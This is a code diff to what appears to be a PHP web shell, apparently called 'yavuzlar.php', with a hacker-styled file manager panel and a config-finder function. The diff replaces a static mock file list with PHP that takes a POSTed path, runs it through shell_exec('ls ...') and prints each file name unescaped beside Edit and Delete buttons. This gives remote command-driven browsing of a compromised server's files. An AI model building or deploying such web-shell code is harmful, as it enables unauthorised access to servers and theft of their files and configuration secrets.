@@ -17,7 +17,6 @@
       .container {
         border: 1px solid green;
         border-radius: 10px;
-        height: 700px;
       }
       .header {
         color: whitesmoke;
@@ -134,7 +133,12 @@
       .file-table {
         margin-top: 30px;
       }
-      td {
+      .file-button:hover {
+        background-color: green;
+        color: #222222;
+        cursor: pointer;
+      }
+      td, th {
         padding: 5px 10px;
       }
     </style>
@@ -238,32 +242,39 @@
         fileManager.style.color = "lime";
 
         content.innerHTML = `
-          <div class="file-margin">
-            <input type="search" class="file-search" placeholder="Enter a path.."><button type="submit" class="file-button">Search</button>
-            <button class="file-button">Upload File</button>
-          </div>
-          <table class="file-table" border="1">
+        <div class="file-margin">
+            <form method="POST">
+                <input type="text" name="path" class="file-search" placeholder="Enter a path.." required>
+                <button type="submit" class="file-button">Search</button>
+            </form>
+        </div>
+        <table class="file-table" border="1">
             <tr>
-              <th>File Name</th>
-              <th>Actions</th>
+                <th>File Name</th>
+                <th>Actions</th>
             </tr>
-            <tr>
-              <td>yavuzlar.php</td>
-              <td>
-                <button class="file-button">Edit</button>
-                <button class="file-button">Delete</button>
-              </td>
-            </tr>
-            <tr>
-              <td>Test File</td>
-              <td>
-                <button class="file-button">Edit</button>
-                <button class="file-button">Delete</button>
-              </td>
-            </tr>
-          </table>
-        `;
+            <?php
+            if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['path'])) {
+                $path = escapeshellarg($_POST['path']); 
 
+                $files = shell_exec("ls $path 2>&1");
+                $fileArray = explode("\n", trim($files));
+
+                foreach ($fileArray as $file) {
+                    if (!empty($file)) {
+                        echo "<tr>
+                                <td>{$file}</td>
+                                <td>
+                                    <button class='file-button'>Edit</button>
+                                    <button class='file-button'>Delete</button>
+                                </td>
+                              </tr>";
+                    }
+                }
+            }
+            ?>
+        </table>
+    `;
       }
 
       function configFinderFunction() {
